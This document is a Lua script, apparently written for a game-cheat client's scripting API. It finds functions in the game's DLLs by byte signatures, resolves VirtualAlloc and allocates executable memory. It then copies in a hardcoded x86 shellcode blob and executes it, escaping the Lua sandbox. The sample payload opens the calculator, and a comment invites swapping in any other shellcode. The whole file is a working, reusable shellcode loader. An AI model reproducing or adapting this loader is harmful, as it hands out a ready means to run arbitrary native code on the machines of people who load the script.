local ffi = require("ffi")
local get_export_raw = client.find_signature("tier0.dll", "\x55\x8B\xEC\x56\xFF\x75\x08\x8B\xF1\xC7") or error("Failed to find get_export signature!")
local get_export = ffi.cast("int(__thiscall*)(void*, const char*, const char*)", get_export_raw)
local function get_export_address(module_name, export_name)
    local buffer = ffi.new("unsigned int[8]")
    get_export(buffer, module_name, export_name)
    return buffer[1] > 0 and buffer[1]
end

local cast_sig = client.find_signature("engine.dll", "\x55\x8B\xEC\xFF\x75\x14\x8B\x49\x04") or error("Failed to find cast signature!")
local cast = ffi.cast("int(__thiscall*)(unsigned int**, int, int, int, int)", cast_sig) or error("Failed to cast raw cast!")
local function virtual_alloc_setup(func_address, address, size, allocationtype, protect)
    local buf_1 = ffi.new("unsigned int[11]")
    buf_1[10] = func_address;
    local buf_2 = ffi.new("unsigned int[1]")
    buf_2[0] = ffi.cast(ffi.typeof("unsigned int"), buf_1)
    local buf_3 = ffi.new("unsigned int[2]")
    buf_3[1] = ffi.cast(ffi.typeof("unsigned int"), buf_2)
    return cast(ffi.cast(ffi.typeof("unsigned int**"), buf_3), address, size, allocationtype, protect)
end
local virtual_alloc_raw = get_export_address("kernel32.dll", "VirtualAlloc")
local function virtual_alloc(address, size, allocationtype, protect)
    return virtual_alloc_setup(virtual_alloc_raw, address, size, allocationtype, protect)
end

-- put shellcode in the string below :)
-- this shellcode executes calculator
local shellcode = "\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7"
local shellcode_address = virtual_alloc(0, #shellcode + 1, 0x1000, 0x40)
ffi.copy(ffi.cast("void*", shellcode_address), shellcode, #shellcode + 1)

local cast2_sig = client.find_signature("client.dll", "\x83\xEC\x0C\xC7\x45\xCC\xCC\xCC\xCC\xCC\x8B\xC4\xC7\x45\xF4") or error("Failed to find cast2 signature!")
local cast2 = ffi.cast("int(__thiscall*)(void*)", ffi.cast("void**", ffi.cast("int", cast2_sig) + 6)[0])
local buf_1 = ffi.new("unsigned int[3]")
buf_1[2] = shellcode_address
local buf_2 = ffi.new("unsigned int[1]")
buf_2[0] = ffi.cast("unsigned int", buf_1)

cast2(buf_2) -- actual execute